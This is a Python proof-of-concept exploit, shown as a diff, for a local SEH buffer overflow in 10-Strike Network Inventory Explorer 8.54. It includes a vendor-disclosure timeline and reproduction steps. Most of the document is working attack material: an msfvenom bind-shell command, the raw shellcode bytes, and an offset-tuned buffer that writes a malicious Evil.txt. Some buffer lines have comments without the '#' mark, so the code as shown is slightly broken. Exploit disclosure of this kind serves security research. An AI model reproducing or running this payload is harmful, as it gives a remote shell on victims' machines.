@@ -1,0 +1,75 @@
+# Exploit Title      : 10-Strike Network Inventory Explorer 8.54 - Local Buffer Overflow (SEH)  
+# Exploit Author     : Hashim Jawad - ihack4falafel                                                      
+# Vendor Homepage    : https://www.10-strike.com/                                                         
+# Vulnerable Software: https://www.10-strike.com/networkinventoryexplorer/network-inventory-setup.exe     
+# Tested on          : Windows 7 Enterprise - SP1 (x86)                                                   
+# Disclosure Timeline:
+# 06-02-18: Contacted vendor, no response 
+# 06-03-18: Contacted vendor, no response
+# 06-04-18: Contacted vendor, no response
+# 06-05-18: Proof of concept exploit published 
+
+# Steps to reproduce:
+# - Under Computers tab click on 'From Text File'
+# - Open Evil.txt and boom!
+# Notes:
+# - The following modules have no protection making the exploit universal: [sqlite3.dll, ssleay32.dll, MSVCR71.dll]
+# - Next SEH offset is 211 bytes but for some reason passing the exception to the program will result in shifting 
+#   the stack by 8 bytes, see buffer for reference.
+# - Keep in mind the exploit is contingent on path, and as such you need to make sure offsets stay intact based on 
+#   your username, the following is the path used while developing the exploit (default on Windows 7): 
+#   [C:\Users\IEUser\AppData\Roaming\10-strike\Network Inventory\cfg\]
+# - Pro edition is effected as well.   
+
+#root@kali:~# msfvenom -p windows/shell_bind_tcp -b '\x00\x0a\x0d\x3a\x5c' -f python -v shellcode
+#Payload size: 355 bytes
+
+#!/usr/bin/python
+
+shellcode =  ""
+shellcode += "\xba\x58\x39\xb1\xae\xd9\xcf\xd9\x74\x24\xf4\x5f"
+shellcode += "\x29\xc9\xb1\x53\x83\xef\xfc\x31\x57\x0e\x03\x0f"
+shellcode += "\x37\x53\x5b\x53\xaf\x11\xa4\xab\x30\x76\x2c\x4e"
+shellcode += "\x01\xb6\x4a\x1b\x32\x06\x18\x49\xbf\xed\x4c\x79"
+shellcode += "\x34\x83\x58\x8e\xfd\x2e\xbf\xa1\xfe\x03\x83\xa0"
+shellcode += "\x7c\x5e\xd0\x02\xbc\x91\x25\x43\xf9\xcc\xc4\x11"
+shellcode += "\x52\x9a\x7b\x85\xd7\xd6\x47\x2e\xab\xf7\xcf\xd3"
+shellcode += "\x7c\xf9\xfe\x42\xf6\xa0\x20\x65\xdb\xd8\x68\x7d"
+shellcode += "\x38\xe4\x23\xf6\x8a\x92\xb5\xde\xc2\x5b\x19\x1f"
+shellcode += "\xeb\xa9\x63\x58\xcc\x51\x16\x90\x2e\xef\x21\x67"
+shellcode += "\x4c\x2b\xa7\x73\xf6\xb8\x1f\x5f\x06\x6c\xf9\x14"
+shellcode += "\x04\xd9\x8d\x72\x09\xdc\x42\x09\x35\x55\x65\xdd"
+shellcode += "\xbf\x2d\x42\xf9\xe4\xf6\xeb\x58\x41\x58\x13\xba"
+shellcode += "\x2a\x05\xb1\xb1\xc7\x52\xc8\x98\x8f\x97\xe1\x22"
+shellcode += "\x50\xb0\x72\x51\x62\x1f\x29\xfd\xce\xe8\xf7\xfa"
+shellcode += "\x31\xc3\x40\x94\xcf\xec\xb0\xbd\x0b\xb8\xe0\xd5"
+shellcode += "\xba\xc1\x6a\x25\x42\x14\x06\x2d\xe5\xc7\x35\xd0"
+shellcode += "\x55\xb8\xf9\x7a\x3e\xd2\xf5\xa5\x5e\xdd\xdf\xce"
+shellcode += "\xf7\x20\xe0\xe1\x5b\xac\x06\x6b\x74\xf8\x91\x03"
+shellcode += "\xb6\xdf\x29\xb4\xc9\x35\x02\x52\x81\x5f\x95\x5d"
+shellcode += "\x12\x4a\xb1\xc9\x99\x99\x05\xe8\x9d\xb7\x2d\x7d"
+shellcode += "\x09\x4d\xbc\xcc\xab\x52\x95\xa6\x48\xc0\x72\x36"
+shellcode += "\x06\xf9\x2c\x61\x4f\xcf\x24\xe7\x7d\x76\x9f\x15"
+shellcode += "\x7c\xee\xd8\x9d\x5b\xd3\xe7\x1c\x29\x6f\xcc\x0e"
+shellcode += "\xf7\x70\x48\x7a\xa7\x26\x06\xd4\x01\x91\xe8\x8e"
+shellcode += "\xdb\x4e\xa3\x46\x9d\xbc\x74\x10\xa2\xe8\x02\xfc"
+shellcode += "\x13\x45\x53\x03\x9b\x01\x53\x7c\xc1\xb1\x9c\x57"
+shellcode += "\x41\xc1\xd6\xf5\xe0\x4a\xbf\x6c\xb1\x16\x40\x5b"
+shellcode += "\xf6\x2e\xc3\x69\x87\xd4\xdb\x18\x82\x91\x5b\xf1"
+shellcode += "\xfe\x8a\x09\xf5\xad\xab\x1b"
+
+buffer  = '\x41' * 207                           filler to nSEH offset (211-4)
+buffer += '\x9f\x4e\xe9\x61'                     0x61E94E9F [sqlite3.dll] | jmp esp
+buffer += '\x90\x90\x90\x90'                     nSEH
+buffer += '\x90\x90\x90\x90'                     SEH 
+buffer += shellcode                              bind shell 
+buffer += '\xcc' * (3000-207-12-len(shellcode))  junk 
+
+try:
+	f=open("Evil.txt","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except Exception as e:
+	print e
